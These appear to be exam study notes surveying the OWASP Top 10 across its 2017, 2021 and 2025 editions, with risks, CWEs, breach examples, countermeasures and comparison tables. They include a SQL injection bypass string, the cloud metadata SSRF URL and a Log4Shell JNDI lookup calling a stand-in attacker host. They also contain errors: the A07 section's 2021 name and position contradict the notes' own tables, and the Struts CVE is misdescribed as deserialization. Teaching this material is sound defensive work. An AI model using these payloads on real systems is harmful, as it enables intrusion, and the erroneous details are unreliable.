# 01-session_01A_T.md
# OWASP Top 10 — Full Overview (2017 · 2021 · 2025)

---

## 📑 Table of Contents

- [1. What is OWASP Top 10?](#1-what-is-owasp-top-10)
- [2. How the List is Built](#2-how-the-list-is-built)
- [3. OWASP Top 10 : 2025 — All 10 Categories](#3-owasp-top-10--2025--all-10-categories)
  - [A01:2025 — Broken Access Control](#a012025--broken-access-control)
  - [A02:2025 — Security Misconfiguration](#a022025--security-misconfiguration)
  - [A03:2025 — Software Supply Chain Failures](#a032025--software-supply-chain-failures)
  - [A04:2025 — Cryptographic Failures](#a042025--cryptographic-failures)
  - [A05:2025 — Injection](#a052025--injection)
  - [A06:2025 — Insecure Design](#a062025--insecure-design)
  - [A07:2025 — Authentication Failures](#a072025--authentication-failures)
  - [A08:2025 — Software or Data Integrity Failures](#a082025--software-or-data-integrity-failures)
  - [A09:2025 — Security Logging and Alerting Failures](#a092025--security-logging-and-alerting-failures)
  - [A10:2025 — Mishandling of Exceptional Conditions](#a102025--mishandling-of-exceptional-conditions)
- [4. 📌 Extra Notes](#4--extra-notes)
  - [4.1 OWASP Top 10 : 2021 — Full List](#41-owasp-top-10--2021--full-list)
  - [4.2 OWASP Top 10 : 2017 — Full List](#42-owasp-top-10--2017--full-list)
  - [4.3 Three-Way Comparison Table (2017 → 2021 → 2025)](#43-three-way-comparison-table-2017--2021--2025)
  - [4.4 What Moved — Ranking Shifts Explained](#44-what-moved--ranking-shifts-explained)
  - [4.5 What Merged — Consolidations Across Versions](#45-what-merged--consolidations-across-versions)
  - [4.6 What's New in 2025](#46-whats-new-in-2025)
  - [4.7 Why Each Change Happened — Root Cause Analysis](#47-why-each-change-happened--root-cause-analysis)
  - [4.8 OWASP Methodology — How the List is Scored](#48-owasp-methodology--how-the-list-is-scored)
  - [4.9 OWASP Top 10 vs Compliance Standards](#49-owasp-top-10-vs-compliance-standards)
  - [4.10 CWE Mapping Stats Across Versions](#410-cwe-mapping-stats-across-versions)
  - [4.11 Update History — All Versions](#411-update-history--all-versions)
- [5. Abbreviations Table](#5-abbreviations-table)
- [6. Keywords + Concept Map](#6-keywords--concept-map)
- [7. Quick Reference Cheatsheet](#7-quick-reference-cheatsheet)
- [8. Session Revision Snapshot](#8-session-revision-snapshot)

---

## 1. What is OWASP Top 10?

- **OWASP** = Open Web Application Security Project — international non-profit focused on improving software security
- **OWASP Top 10** = a standard awareness document listing the 10 most critical security risks to web applications
- It is **not** an exhaustive vulnerability list — it is a risk-prioritized awareness baseline
- Globally recognized as the **first step toward secure coding** for developers and security teams
- Used as a **baseline reference** in security policies, audits, penetration testing, compliance frameworks, and developer training
- OWASP materials are **freely available** — documentation, tools, videos, forums — all open access
- The list is built from **data-driven analysis + community practitioner survey** — combining what tools find with what experts see in real attacks

> [!IMPORTANT]
> OWASP Top 10 is an **awareness document**, not a legal compliance standard on its own. However, PCI DSS 4.0 (Req 6.2.4), SOC 2, and HIPAA all reference OWASP Top 10 coverage as accepted evidence of secure coding practices.

---

## 2. How the List is Built

OWASP uses a **dual methodology**:

| Input Type | Description |
|---|---|
| **Data-driven analysis** | CWE scan data contributed by security vendors, consultancies, bug bounties, organizations |
| **Practitioner survey** | Global survey of pentesters, AppSec engineers, security architects — captures what practitioners see before data catches up |

**2025 Dataset Stats:**
- Analyzed **589 CWEs** (up from ~400 in 2021)
- Based on **175,000+ CVE records**
- Input from security vendors, bug bounty programs, community contributors
- Each category maps to specific **CWEs — 248 total across all 10 categories** (up from 218 in 2021)
- Broken Access Control (A01) alone maps to **40 CWEs** — largest single category

**Scoring factors used:**

| Factor | What it Measures |
|---|---|
| **Prevalence** | How commonly the vulnerability appears across tested apps |
| **Severity** | Potential impact when exploited |
| **Incidence Rate** | Likelihood that a given app has at least one instance |

> [!NOTE]
> OWASP shifted from measuring **frequency** (how many times a vuln appears) to **incidence rate** (how many apps have it at least once) starting with the 2021 edition. This change made the data more meaningful — a single app with 1000 SQLi instances counts the same as an app with 1.

---

## 3. OWASP Top 10 : 2025 — All 10 Categories

---

### A01:2025 — Broken Access Control

**Position:** #1 (unchanged from 2021)

#### What it is
Access control enforces that users can only perform actions within their intended permissions. Broken Access Control occurs when these restrictions are misconfigured, missing, or bypassable — allowing attackers to act as other users, access unauthorized data, or perform privileged functions.

#### Scope in 2025
- **100% of tested applications** showed some form of broken access control
- Highest number of occurrences in the contributed dataset
- Second highest number of related CVEs
- Maps to **40 CWEs** — largest single category in the 2025 list
- **SSRF (A10:2021)** has been absorbed into this category in 2025

#### Key CWEs Mapped
| CWE | Description |
|---|---|
| CWE-200 | Exposure of Sensitive Information to an Unauthorized Actor |
| CWE-201 | Exposure of Sensitive Information Through Sent Data |
| CWE-918 | Server-Side Request Forgery (SSRF) |
| CWE-352 | Cross-Site Request Forgery (CSRF) |

#### Common Vulnerability Patterns
- Bypassing access control checks by modifying URL, internal application state, or HTML page
- Allowing the primary key to be changed to another user's record (IDOR — Insecure Direct Object Reference)
- Elevation of privilege — acting as admin when logged in as a regular user
- Metadata manipulation — replaying or tampering with JWT tokens, cookies, or hidden fields to elevate privilege
- CORS misconfiguration allowing API access from unauthorized origins
- Accessing APIs with missing access controls for POST, PUT, DELETE
- Path traversal — accessing files outside intended directories
- SSRF — server is coerced into making requests to unauthorized internal or external resources

#### Real-World Example
**Facebook IDOR (2012):** Attackers could delete any photo from any account by modifying the `photo_id` parameter in a request — no privilege check was enforced server-side.

**SSRF on AWS EC2 (common pattern):** Attacker triggers SSRF to reach `http://169.254.169.254/latest/meta-data/` — the AWS metadata endpoint — to extract IAM credentials, allowing full AWS account takeover.

#### Countermeasures
- Deny access by default — explicitly allow what is permitted, deny everything else
- Implement access control once and reuse it throughout the application (centralized)
- Enforce record ownership — user should only access their own resources unless explicitly granted
- Disable directory listing on web servers
- Log access control failures and alert on repeated failures (potential brute force or enumeration)
- Rate-limit API and controller access to minimize automated attack impact
- Invalidate stateful session tokens on logout; make stateless JWT tokens short-lived
- For SSRF: allowlist outbound destinations, block cloud metadata IPs (169.254.169.254), validate URL schemes

---

### A02:2025 — Security Misconfiguration

**Position:** #2 (moved up from #5 in 2021) — **biggest ranking jump in 2025**

#### What it is
Security misconfiguration occurs when security settings are defined, implemented, or maintained incorrectly. It covers a massive attack surface — from default credentials left unchanged to overly verbose error messages to improperly secured cloud storage buckets.

#### Why it jumped to #2
Real-world breach data from 2021–2024 consistently traced back to:
- Default credentials on admin interfaces
- Overly permissive cloud IAM policies
- Publicly exposed S3 buckets
- Production systems running debug configurations
- Cloud-native misconfigurations at scale (every cloud deployment has config, and config drifts)

#### Common Vulnerability Patterns
- Default accounts and passwords still enabled
- Unnecessary features enabled (ports, services, pages, accounts, privileges)
- Error messages exposing stack traces, internal paths, or database schema information
- Missing or incorrect HTTP security headers (CSP, HSTS, X-Frame-Options, etc.)
- XML External Entities (XXE) — previously its own category in 2017 (A4:2017), merged into Security Misconfiguration in 2021 and retained in 2025 under this category
- Cloud storage buckets with public read/write
- Unrestricted CORS — any origin allowed
- Security settings in cloud services left at insecure defaults

#### Real-World Example
**Capital One Breach (2019):** Misconfigured WAF on AWS allowed SSRF to reach EC2 metadata endpoint. The IAM role attached to the server had excessive permissions — a classic Security Misconfiguration + access control failure combination. Exposed 100M+ customer records.

**MongoDB/Elasticsearch Exposed DBs (2017–ongoing):** Databases deployed to cloud without authentication enabled — default "no auth" configuration — resulted in mass data exposure events.

#### Countermeasures
- Automated configuration scanning in CI/CD pipelines
- Minimal platform — remove unused features, frameworks, components
- Segmented application architecture — different security for different tiers
- Security headers hardening (covered deeply in Session 03A)
- Consistent patching and update process
- Review and harden all cloud IAM policies — principle of least privilege
- Disable default accounts or change default credentials immediately post-deployment
- Centralized config management tools (Ansible, Terraform, Chef)

---

### A03:2025 — Software Supply Chain Failures

**Position:** #3 (NEW category in 2025 — expands and rebrands A09:2021 Vulnerable and Outdated Components)

#### What it is
Supply chain failures occur when any component in the software build, delivery, or deployment pipeline introduces vulnerabilities or is compromised. This extends far beyond "using a vulnerable npm package" — it includes build tool compromise, tampered packages in registries, malicious CI/CD pipeline steps, and dependency confusion attacks.

> [!NOTE]
> This is a **rebranding and expansion** of A09:2021 "Vulnerable and Outdated Components." The 2021 version focused narrowly on outdated dependencies. The 2025 version expands scope to include the **entire supply chain** — build tools, package managers, CI/CD pipelines, container base images, code signing, and third-party integrations.

#### Why it's here as a new category
- SolarWinds attack (2020): malicious code injected into build system → 18,000+ organizations compromised via a trusted software update
- XZ Utils backdoor (2024): a maintainer-level compromise of a widely used compression library, nearly shipped in major Linux distributions
- npm/PyPI typosquatting and dependency confusion attacks becoming routine
- Supply chain is now recognized as a primary initial access vector in nation-state attacks

#### Attack Surface
| Vector | Example |
|---|---|
| Dependency confusion | Attacker publishes `internal-utils` to public npm; build system picks it up over internal package |
| Typosquatting | `lodahs` instead of `lodash` in npm |
| Compromised maintainer account | Attacker gains access to legitimate package maintainer and pushes malicious version |
| Build system compromise | Malicious code injected at CI/CD step (SolarWinds model) |
| Container base image | `FROM ubuntu:latest` pulls a tampered base image |
| Unsigned packages | No cryptographic verification of downloaded artifacts |

#### Key Concepts
- **SBOM (Software Bill of Materials):** A formal record of all components in a piece of software — their versions, licenses, and known vulnerabilities. Formats: **CycloneDX**, **SPDX**
- **SCA (Software Composition Analysis):** Tooling that scans dependencies for known vulnerabilities (Snyk, OWASP Dependency-Check, GitHub Dependabot)
- **Dependency signature verification:** Checking cryptographic signatures on packages before use

#### Countermeasures
- Maintain an SBOM for all applications
- Use signed and verified packages (npm audit signatures, pip hash checking)
- Pin dependency versions — avoid `latest` or `*` wildcards
- Use private registries with verified mirrors
- Implement dependency confusion protections (namespace scoping, private registry priority)
- Run SCA tools in CI/CD pipelines
- Monitor for CVE disclosures against your dependency tree
- Apply least-privilege to CI/CD pipeline permissions

---

### A04:2025 — Cryptographic Failures

**Position:** #4 (moved down from #2 in 2021)

> [!NOTE]
> In 2021 this was renamed from A3:2017 "Sensitive Data Exposure" to "Cryptographic Failures" to focus on the **root cause** (bad crypto) rather than the **symptom** (exposed data). This naming was retained in 2025.

#### What it is
Cryptographic failures occur when data is transmitted or stored without adequate cryptographic protection, or when weak/broken cryptographic algorithms are used. The result is exposure of sensitive data — passwords, credit card numbers, health records, personal information.

#### Common Vulnerability Patterns
- Data transmitted in cleartext (HTTP instead of HTTPS, FTP, SMTP without TLS)
- Weak or deprecated algorithms: MD5, SHA-1, DES, RC4
- Hardcoded cryptographic keys in source code
- Inadequate key management — keys never rotated, keys stored in plaintext
- Passwords stored with weak or unsalted hashes (MD5, SHA-1)
- Deprecated TLS versions (TLS 1.0, TLS 1.1) still supported
- Missing HSTS — allows protocol downgrade to HTTP
- Predictable or weak IVs (Initialization Vectors) in block ciphers
- Sensitive data cached in browser or intermediate proxies without `Cache-Control: no-store`

#### Key Concepts

| Concept | Detail |
|---|---|
| **Perfect Forward Secrecy (PFS)** | Session keys are not derivable from long-term private keys — uses ephemeral Diffie-Hellman. Prevents retroactive decryption if private key is later compromised |
| **Salting** | Adding a random value to a password before hashing — prevents rainbow table attacks |
| **Key Derivation Function (KDF)** | bcrypt, scrypt, Argon2 — designed for slow password hashing, making brute force expensive |
| **TLS downgrade** | Attacker forces negotiation of weaker TLS version or cipher — POODLE attack (SSL 3.0), BEAST (TLS 1.0) |
| **HSTS** | HTTP Strict Transport Security — tells browser to always use HTTPS, prevents downgrade |

#### Real-World Example
**RockYou2024 (2024):** ~10 billion plaintext passwords compiled from breached databases — many sourced from sites that stored passwords as unsalted MD5 hashes. Direct result of cryptographic failure at the storage layer.

**Heartbleed (OpenSSL, 2014):** CVE-2014-0160 — buffer over-read in OpenSSL's TLS heartbeat extension. Allowed attackers to read server memory, exposing private keys, passwords, and session tokens. No encryption failure per se, but resulted in complete cryptographic compromise.

#### Countermeasures
- Enforce HTTPS everywhere — HSTS with `includeSubDomains` and `preload`
- Disable TLS 1.0, TLS 1.1 — only TLS 1.2+ (prefer TLS 1.3)
- Use strong cipher suites — AES-256-GCM, ChaCha20-Poly1305
- Hash passwords with Argon2id (preferred), bcrypt, or scrypt — never MD5/SHA-1
- Encrypt sensitive data at rest with AES-256
- Do not store sensitive data you don't need — minimize data retention
- Enforce proper key management — rotate keys, use HSMs (Hardware Security Modules) for production
- Set `Cache-Control: no-store` on responses containing sensitive data
- Disable HTTP compression for sensitive data (CRIME/BREACH attack vectors)

---

### A05:2025 — Injection

**Position:** #5 (moved down from #3 in 2021; was #1 in 2017)

#### What it is
Injection flaws occur when untrusted data is sent to an interpreter as part of a command or query. The interpreter executes the attacker-supplied data as code rather than as data, leading to data theft, data loss, data corruption, or complete host takeover.

> [!NOTE]
> In 2021, **XSS (A7:2017)** was merged into the Injection category. This consolidation was retained in 2025. XSS is now officially a subset of A05:2025 Injection.

#### Injection Sub-Types Covered in 2025

| Type | Description |
|---|---|
| **SQL Injection (SQLi)** | Malicious SQL code injected into a query — can read, modify, or delete database data |
| **Cross-Site Scripting (XSS)** | Malicious scripts injected into web pages — executed in victim's browser |
| **OS Command Injection** | Shell commands injected through application input — executes on host OS |
| **LDAP Injection** | Malicious LDAP statements to manipulate directory service queries |
| **XML/XPath Injection** | Injecting XPath expressions to manipulate XML data queries |
| **NoSQL Injection** | Injecting operators or expressions into NoSQL (MongoDB) queries |
| **Server-Side Template Injection (SSTI)** | Injecting template syntax into server-side template engines (Jinja2, Twig, Freemarker) |
| **CRLF Injection** | Inserting carriage return/line feed characters to manipulate HTTP headers |
| **Email Header Injection** | Injecting headers into email sending functions |

> [!NOTE]
> Injection has the greatest number of CVEs across all categories. Ironically, it fell to #5 not because it's less dangerous — SQLi and OS command injection are still "game over" vulnerabilities — but because its **incidence rate** (how many apps have it) has declined due to widespread adoption of ORMs and parameterized queries. XSS remains extremely high frequency but lower per-instance impact.

#### Mechanism (SQL Injection)
```
Normal query:  SELECT * FROM users WHERE user = '$user' AND pass = '$pass'
Injected input: ' OR '1'='1
Resulting query: SELECT * FROM users WHERE user = '' OR '1'='1' -- ' AND pass = ''
Result: Condition is always true → authentication bypassed
```

#### Real-World Example
**Heartland Payment Systems (2008):** Classic SQL injection attack exploited a vulnerable web form. Attackers planted malware on internal systems and exfiltrated over 130 million credit card numbers — one of the largest payment card breaches in US history at the time.

#### Countermeasures
- Use parameterized queries / prepared statements — the #1 defense against SQLi
- Use stored procedures correctly (still parameterized, not string-concatenated)
- Input validation — allowlist, not denylist
- Escape special characters when parameterization is not possible
- Use ORM frameworks (Hibernate, SQLAlchemy) — they parameterize by default
- Principle of least privilege on DB accounts — app user should not have DROP/ALTER permissions
- For XSS: output encoding, Content Security Policy (CSP), `HttpOnly` and `Secure` cookie flags
- SAST + DAST tools to detect injection points in CI/CD pipelines

---

### A06:2025 — Insecure Design

**Position:** #6 (moved down from #4 in 2021)

#### What it is
Insecure Design covers architectural and design-level weaknesses — flaws that are baked into the blueprint of the application before a single line of code is written. These cannot be patched; they require redesign.

> [!IMPORTANT]
> The key distinction: **Insecure Design ≠ Insecure Implementation.** A perfectly coded feature can still be insecure by design. Example: a password reset flow that uses a 4-digit PIN is insecurly designed — no amount of correct coding fixes the fundamentally weak entropy.

#### Common Patterns
- No rate limiting on login — brute force possible by design
- Credential recovery using security questions (weak by design)
- Business logic flaws — e.g., allowing negative quantities in a shopping cart to get refunds
- Excessive data exposure by design — API returns full user object when only name is needed
- Missing threat modeling during design phase
- Trust assumptions built into the architecture that attackers can violate

#### Key Concepts

| Concept | Description |
|---|---|
| **Secure by Design** | Security is built into the architecture from day one, not bolted on after |
| **Threat Modeling** | Structured process of identifying and addressing threats during design — STRIDE, PASTA, DREAD (covered in Session 03A) |
| **Security Paved Roads** | Libraries, frameworks, and patterns that make secure implementation the easiest path |
| **Reference Architecture** | Pre-approved secure design patterns provided to development teams |

#### Real-World Example
**Multi-factor authentication bypass (common pattern):** Application sends OTP but doesn't enforce that the OTP step must be completed before allowing account access. Attacker authenticates with valid credentials, skips the OTP URL, and directly accesses authenticated pages — insecure design, not a coding bug.

#### Countermeasures
- Integrate threat modeling into the design phase (before development)
- Define security requirements during requirements gathering
- Use reference architectures and pre-vetted security libraries
- Establish paved roads — make secure patterns the default and easiest choice
- Conduct design reviews with AppSec team before implementation
- Apply principle of least privilege at architecture level

---

### A07:2025 — Authentication Failures

**Position:** #7 (was A02:2021 Broken Authentication — moved down three positions)

> [!NOTE]
> The name changed slightly between versions — 2021 used "Broken Authentication"; 2025 uses "Authentication Failures." The scope is identical — the rename aligns terminology with the CWE community's language.

#### What it is
Authentication failures occur when an application's confirmation of a user's claimed identity is flawed, allowing attackers to assume other users' identities.

#### Common Vulnerability Patterns
- Credential stuffing — application permits automated attacks with no rate limiting or lockout
- Brute force — weak passwords allowed, no account lockout
- Weak or default passwords allowed (passwords like `admin`, `password123` accepted)
- Weak credential recovery (security questions, insecure "forgot password" flows)
- Plain text or weakly hashed passwords in storage (this overlaps with A04)
- Missing or ineffective MFA
- Session tokens exposed in URLs (appear in server logs, browser history)
- Session tokens not invalidated after logout
- Session tokens not rotated after successful login (session fixation)
- JWT algorithm confusion — accepting `alg: none` or switching RS256 to HS256

#### Key Concepts

| Concept | Description |
|---|---|
| **Credential Stuffing** | Using leaked username/password lists from other breaches against the target app |
| **Session Fixation** | Attacker sets a known session ID before login — after victim logs in with it, attacker has valid session |
| **JWT `alg:none`** | JWT spec allows `alg: none` (unsigned) — vulnerable servers accept tampered unsigned tokens |
| **Session Hijacking** | Stealing a valid session token via XSS, network sniffing, or log exposure |

#### Real-World Example
**LinkedIn Breach (2012/2016):** 6.5 million hashes leaked in 2012 (unsalted SHA-1). Full 117 million record dump surfaced in 2016. The unsalted SHA-1 hashes were cracked rapidly — authentication failure at the storage layer enabled mass account takeover.

#### Countermeasures
- Implement MFA — especially for admin/high-privilege accounts
- Rate limiting on authentication endpoints
- Account lockout after N failed attempts (with CAPTCHA to prevent lockout-based DoS)
- Block known breached passwords using services like HaveIBeenPwned API
- Use secure session management — HttpOnly, Secure, SameSite cookies
- Invalidate session tokens on logout on the server side
- Rotate session IDs after successful authentication (prevent session fixation)
- Set session token expiry — both idle timeout and absolute timeout

---

### A08:2025 — Software or Data Integrity Failures

**Position:** #8 (same as A08:2021 — name and position **unchanged**)

> [!NOTE]
> This is the one category that did **not change** between 2021 and 2025 — same name, same position, same scope. MCQs may try to trick you into saying it moved or was renamed. It did neither.

#### What it is
Integrity failures occur when software updates, critical data, or CI/CD pipelines are used without verifying integrity — allowing attackers to inject malicious code or data through trusted channels.

#### Common Vulnerability Patterns
- Auto-update mechanisms that download and execute without signature verification
- Insecure deserialization — untrusted serialized data deserialized without integrity checks
- Using plugins/libraries from untrusted sources
- CI/CD pipeline without integrity controls — compromised build step can inject malware
- Using unverified CDN-hosted JavaScript libraries

#### Insecure Deserialization — Key Detail

Deserialization converts byte streams back into objects. If attacker-controlled data is deserialized without validation:
- **Remote Code Execution (RCE)** is possible via deserialization gadget chains
- Languages affected: Java (Apache Commons Collections gadget chain), PHP, Python (pickle), Ruby, .NET

```
Attack flow:
1. Attacker crafts a malicious serialized object
2. Application deserializes it (e.g., from a cookie, API parameter, or message queue)
3. Gadget chain executes — OS commands run as the application's process user
```

#### Real-World Example
**SolarWinds Orion (2020):** Malicious code (SUNBURST backdoor) was injected into the SolarWinds build process. The software update was signed by SolarWinds' legitimate certificate — customers had no way to detect it. 18,000+ organizations installed the malicious update. Classic CI/CD integrity failure.

**Apache Struts (CVE-2017-5638):** Deserialization of untrusted data in the Jakarta Multipart parser allowed RCE. Used in the **Equifax breach** — 147 million records exposed.

#### Countermeasures
- Verify digital signatures of software packages and updates before execution
- Ensure serialized objects from untrusted sources are never deserialized — use JSON instead where possible
- Implement integrity checks via hash verification for all downloaded artifacts
- Use SBOM to track component integrity
- Restrict CI/CD pipeline permissions — no internet access from build runners unless necessary
- Use signed CI/CD commits (e.g., GPG-signed commits, Sigstore)

---

### A09:2025 — Security Logging and Alerting Failures

**Position:** #9 (same position as A09:2021)

> [!NOTE]
> **Name changed slightly:** 2021 = "Security Logging and **Monitoring** Failures" → 2025 = "Security Logging and **Alerting** Failures." The word "monitoring" was replaced by "alerting" to emphasize that simply logging and watching isn't enough — the system must actively **alert** on detected anomalies.

#### What it is
Insufficient logging, detection, monitoring, and active alerting means breaches are not detected in time. The average time to detect a breach is commonly cited as **200+ days** — giving attackers months of undetected access.

#### Common Vulnerability Patterns
- Logins, failed logins, and high-value transactions not logged
- Logs not monitored — generated but never reviewed
- Warnings and errors generate no or inadequate log messages
- Logs only stored locally — accessible to attacker who already has access
- No alerting on anomalous behavior — no SIEM integration
- Penetration tests and DAST scans don't trigger alerts — no detection capability
- Sensitive data (passwords, PII, tokens) logged in plaintext

#### Key Concepts

| Concept | Description |
|---|---|
| **SIEM** | Security Information and Event Management — aggregates logs, correlates events, triggers alerts |
| **SOC** | Security Operations Center — team monitoring SIEM alerts in real time |
| **Audit Trail** | Immutable log of all security-relevant events — required by PCI DSS, HIPAA |
| **Log Injection** | Attacker inserts malicious content into logs to confuse analysts or exploit log parsers (Log4Shell was a log injection attack) |

#### Real-World Example
**Log4Shell (CVE-2021-44228):** A logging failure in the opposite direction — the logging library itself (Log4j2) was vulnerable. JNDI lookup strings like `${jndi:ldap://attacker.com/a}` were being logged and executed. Affected millions of systems. Illustrates that logging infrastructure itself is an attack surface.

#### Countermeasures
- Log all authentication events (success + failure), access control failures, input validation failures
- Ensure logs contain sufficient context: timestamp, user ID, IP, action, resource affected
- Store logs in a remote, tamper-proof location (SIEM, centralized logging)
- Integrate alerting — alerts for brute force, privilege escalation, anomalous access patterns
- Establish incident response plans and tested runbooks
- Never log sensitive data — mask or tokenize PII, credentials, tokens in logs
- Retain logs for compliance-required periods (PCI DSS: 12 months minimum)

---

### A10:2025 — Mishandling of Exceptional Conditions

**Position:** #10 (BRAND NEW in 2025 — replaces A10:2021 SSRF which was absorbed into A01)

#### What it is
Applications fail to correctly **prevent**, **detect**, and **respond** to unusual or unpredictable situations. When exceptional conditions (errors, timeouts, resource exhaustion, edge cases) are handled poorly, they lead to crashes, unexpected behavior, information disclosure, or exploitable states.

#### Three Failure Modes (OWASP's Definition)
1. The application **doesn't prevent** an unusual situation from happening
2. The application **doesn't identify** the situation as it occurs
3. The application **responds poorly or not at all** to the situation after it happens

#### Common Vulnerability Patterns
- Uncaught exceptions — application crashes or exposes stack traces
- Failing open — authentication or access control defaults to "allow" on error
- Race conditions — TOCTOU (Time-of-Check Time-of-Use) bugs
- Integer overflow/underflow causing unexpected behavior
- Null pointer dereferences
- Resource exhaustion without circuit breakers — memory leaks, thread pool exhaustion
- Timeout handling failures — hanging requests consuming all server threads
- Error messages revealing internal paths, SQL queries, stack traces

#### Key Concepts

| Concept | Description |
|---|---|
| **Fail Secure / Fail Safe** | System defaults to a **secure state** on failure — deny by default on error. "Fail open" (allow on error) is the vulnerability |
| **TOCTOU** | Time-of-Check Time-of-Use — attacker changes state between the check and the use, exploiting the gap |
| **Circuit Breaker Pattern** | Design pattern that stops sending requests to a failing service — prevents cascade failure and resource exhaustion |
| **Graceful Degradation** | System provides reduced functionality on partial failure rather than crashing entirely |
| **Fault Injection Testing** | Deliberately introducing errors to verify the system handles them correctly |

#### Real-World Example
**OpenSSL Heartbleed (CVE-2014-0160):** A classic exceptional conditions failure — the TLS heartbeat handler did not validate that the requested heartbeat payload length matched the actual data sent. The handler would read up to 64KB of server memory to fill the requested length — even if the actual payload was just 1 byte. No bounds check = exception condition not handled = server memory leaked.

**Apache HTTP Server (CVE-2021-41773 / 42013):** Path traversal + RCE via improper handling of path normalization edge cases — exceptional input not validated.

#### Countermeasures
- Never fail open — access control must deny on any error condition
- Catch and handle all exceptions explicitly — no silent failures, no unhandled exception propagation
- Return generic error messages to users — detailed errors only to logs
- Add fault injection to test suites — verify correct behavior on failure
- Implement circuit breakers and bulkheads in distributed systems
- Code review checklist item for exception handling in every PR
- Static analysis (SAST) rules that flag uncaught exceptions and null dereferences

---

## 4. 📌 Extra Notes

---

### 4.1 OWASP Top 10 : 2021 — Full List

> [!NOTE]
> This is the list that was current from 2021 until the 2025 release. Exam questions may test you on 2021 positions specifically, or ask you to distinguish between 2021 and 2025 placements.

| Position | Category | Key Notes |
|---|---|---|
| A01:2021 | Broken Access Control | Moved up from #5 in 2017 |
| A02:2021 | Cryptographic Failures | Renamed from "Sensitive Data Exposure" (A3:2017) — focuses on root cause |
| A03:2021 | Injection | Dropped from #1 in 2017; XSS merged into this category |
| A04:2021 | Insecure Design | **Brand new** in 2021 — did not exist in 2017 |
| A05:2021 | Security Misconfiguration | Includes XXE (previously separate A4:2017) |
| A06:2021 | Vulnerable and Outdated Components | Moved up from #9 in 2017; community survey driven |
| A07:2021 | Identification and Authentication Failures | Renamed from "Broken Authentication" (A2:2017) |
| A08:2021 | Software and Data Integrity Failures | **Brand new** in 2021; includes insecure deserialization (previously A8:2017) |
| A09:2021 | Security Logging and Monitoring Failures | Moved down from #10; renamed (was "Insufficient Logging & Monitoring" in 2017) |
| A10:2021 | Server-Side Request Forgery (SSRF) | **Brand new** in 2021 (via community survey); absorbed into A01:2025 |

---

### 4.2 OWASP Top 10 : 2017 — Full List

> [!NOTE]
> The 2017 list is the predecessor to 2021. Three categories were new in 2017 compared to 2013: A4 (XXE), A8 (Insecure Deserialization), A10 (Insufficient Logging & Monitoring). Two 2013 categories were removed: CSRF and Unvalidated Redirects.

| Position | Category | Key Notes |
|---|---|---|
| A1:2017 | Injection | #1 since the list began — demoted to #3 in 2021, #5 in 2025 |
| A2:2017 | Broken Authentication | High risk; moved to #7 in 2025 |
| A3:2017 | Sensitive Data Exposure | Renamed to "Cryptographic Failures" in 2021 to target root cause |
| A4:2017 | XML External Entities (XXE) | **New in 2017**; merged into Security Misconfiguration in 2021 |
| A5:2017 | Broken Access Control | Moved from #5 to #1 in 2021 — massive jump |
| A6:2017 | Security Misconfiguration | Stable presence; jumped to #2 in 2025 |
| A7:2017 | Cross-Site Scripting (XSS) | **Merged into Injection** in 2021 — no longer a standalone category |
| A8:2017 | Insecure Deserialization | **New in 2017**; merged into A08:2021 Software & Data Integrity Failures |
| A9:2017 | Using Components with Known Vulnerabilities | Renamed and elevated in 2021; expanded to Supply Chain in 2025 |
| A10:2017 | Insufficient Logging and Monitoring | **New in 2017**; retained and renamed in 2021 and 2025 |

---

### 4.3 Three-Way Comparison Table (2017 → 2021 → 2025)

> [!NOTE]
> This is the single most MCQ-tested table in all OWASP content. Memorize every position, every name change, every merge, every new entry.

| 2017 Position | 2017 Name | 2021 Position | 2021 Name | 2025 Position | 2025 Name | Movement |
|---|---|---|---|---|---|---|
| A1 | Injection | A03 | Injection | A05 | Injection | ↓ dropped |
| A2 | Broken Authentication | A07 | Identification and Authentication Failures | A07 | Authentication Failures | ↓ dropped, renamed |
| A3 | Sensitive Data Exposure | A02 | Cryptographic Failures | A04 | Cryptographic Failures | renamed; ↕ position varies |
| A4 | XML External Entities (XXE) | — | *(merged into A05:2021 Security Misconfiguration)* | — | *(still under Security Misconfiguration)* | merged — no standalone |
| A5 | Broken Access Control | A01 | Broken Access Control | A01 | Broken Access Control | ↑ rose to #1 (2021), stable |
| A6 | Security Misconfiguration | A05 | Security Misconfiguration | A02 | Security Misconfiguration | ↑ rose to #2 in 2025 |
| A7 | Cross-Site Scripting (XSS) | — | *(merged into A03:2021 Injection)* | — | *(still under Injection)* | merged — no standalone |
| A8 | Insecure Deserialization | — | *(merged into A08:2021 Software & Data Integrity Failures)* | — | *(still under A08:2025)* | merged |
| A9 | Using Components with Known Vulnerabilities | A06 | Vulnerable and Outdated Components | A03 | Software Supply Chain Failures | ↑ renamed + expanded |
| A10 | Insufficient Logging and Monitoring | A09 | Security Logging and Monitoring Failures | A09 | Security Logging and **Alerting** Failures | renamed; stable position |
| — | *(not in 2017)* | A04 | Insecure Design | A06 | Insecure Design | new in 2021; ↓ dropped in 2025 |
| — | *(not in 2017)* | A08 | Software and Data Integrity Failures | A08 | Software or Data Integrity Failures | new in 2021; unchanged in 2025 |
| — | *(not in 2017)* | A10 | Server-Side Request Forgery (SSRF) | — | *(absorbed into A01:2025)* | new in 2021; removed in 2025 |
| — | *(not present)* | — | *(not present)* | A03 | Software Supply Chain Failures | new in 2025 |
| — | *(not present)* | — | *(not present)* | A10 | Mishandling of Exceptional Conditions | new in 2025 |

---

### 4.4 What Moved — Ranking Shifts Explained

> [!NOTE]
> MCQs love to test exact position numbers. Memorize both the 2021 AND 2025 positions for every category that moved.

| Category | 2017 | 2021 | 2025 | Direction | Why |
|---|---|---|---|---|---|
| Broken Access Control | A5 | **A01** | **A01** | ↑ | 100% of apps tested had some form; consistent #1 data-driven |
| Security Misconfiguration | A6 | A05 | **A02** | ↑↑ | 4 years of breach data traced back to misconfig (cloud IAM, public buckets, defaults) |
| Cryptographic Failures (Sensitive Data Exposure) | A3 | A02 | A04 | ↓ | Other risks more pressing; not less important, just better understood and addressed |
| Injection | **A1** | A03 | A05 | ↓↓ | Widespread adoption of ORMs and parameterized queries lowered incidence rate |
| Insecure Design | N/A | A04 | A06 | ↓ | Introduced in 2021; still important but other risks ranked higher in 2025 data |
| Authentication Failures | A2 | A07 | A07 | ↓→ | Fell significantly from 2017 to 2021; stable since |
| Vulnerable Components / Supply Chain | A9 | A06 | A03 | ↑↑ | Supply chain attacks exploded (SolarWinds, XZ Utils, npm attacks) |
| SSRF | N/A | **A10** | absorbed | removed | Absorbed into A01:2025 — root cause is access control failure |

---

### 4.5 What Merged — Consolidations Across Versions

> [!NOTE]
> Consolidations are heavily tested. Know what was merged, what it was merged **into**, and **why**.

| Removed Category | Year Removed | Merged Into | Rationale |
|---|---|---|---|
